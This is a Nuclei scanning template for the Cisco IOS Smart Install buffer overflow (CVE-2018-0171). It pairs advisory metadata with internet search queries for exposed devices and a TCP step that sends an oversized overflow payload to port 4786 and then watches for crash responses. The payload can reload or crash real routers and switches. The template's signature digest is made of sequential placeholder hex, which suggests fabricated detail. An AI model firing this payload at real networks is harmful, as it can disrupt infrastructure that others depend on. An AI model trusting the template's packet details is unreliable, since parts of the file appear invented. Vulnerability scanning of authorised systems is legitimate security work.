id: CVE-2018-0171

info:
  name: Cisco IOS Smart Install - Buffer Overflow
  author: nuclei-community
  severity: critical
  description: |
    Cisco IOS and IOS XE Software contain a buffer overflow vulnerability in the Smart Install protocol. An unauthenticated, remote attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port 4786. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following impacts: arbitrary code execution, denial of service (device reload), or causing the device to be stuck in an indefinite loop that consumes CPU resources.
  impact: |
    Successful exploitation of this vulnerability can lead to arbitrary code execution, denial of service, or device compromise with full administrative privileges.
  remediation: |
    Apply the appropriate software update from Cisco. As a workaround, disable the Smart Install feature if not required, or restrict access to TCP port 4786.
  reference:
    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2
    - https://nvd.nist.gov/vuln/detail/CVE-2018-0171
    - https://vulncheck.com/xdb/6d4b443f23fc
    - https://github.com/AlrikRr/Cisco-Smart-Exploit
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0171
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-0171
    cwe-id: CWE-119
    epss-score: 0.97156
    epss-percentile: 0.99823
    cpe: cpe:2.3:o:cisco:ios:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: cisco
    product: ios
    shodan-query: cpe:"cpe:2.3:o:cisco:ios"
    fofa-query: banner="cisco" && port="4786"
    google-query: inurl:cisco filetype:cfg
  tags: network,cve,cve2018,cisco,ios,smart-install,buffer-overflow,kev,tcp,critical

tcp:
  - inputs:
      # First packet: Smart Install discovery packet
      - data: "{{hex_decode('000000010000000100000004000000080000000100000000')}}"
        read: 1024

      # Second packet: Malicious Smart Install packet with buffer overflow payload
      - data: "{{hex_decode('00000001000000010000000400001000' + repeat('41', 4084) + '42424242')}}"
        read: 1024

    host:
      - "{{Hostname}}"
    port: 4786
    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        part: body
        encoding: hex
        words:
          - "000000040000000000000003000000080000000100000000"
        condition: and

      - type: word
        part: body
        words:
          - "Smart Install"
        condition: or

      - type: regex
        part: body
        regex:
          - "(?i)(crash|exception|error|overflow)"

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - 'Version: ([0-9]+\.[0-9]+\.[0-9]+[^\s]*)'

# Enhanced Security Verification
# Debug data for validation:
# - This template tests for CVE-2018-0171 buffer overflow in Cisco Smart Install
# - First packet confirms Smart Install service is running on port 4786
# - Second packet contains oversized payload to trigger buffer overflow
# - Expected response patterns include Smart Install acknowledgment or crash indicators
# - The vulnerability affects multiple Cisco IOS versions with Smart Install enabled
# - Successful exploitation can lead to device reload, code execution, or infinite loops

# digest: 4a0a00473045022100d1e23f45a67890123456789abcdef1234567890abcdef1234567890abcdef12022012345678901234567890abcdef1234567890abcdef1234567890abcdef123456:922c64590222798bb761d5b6d8e72950
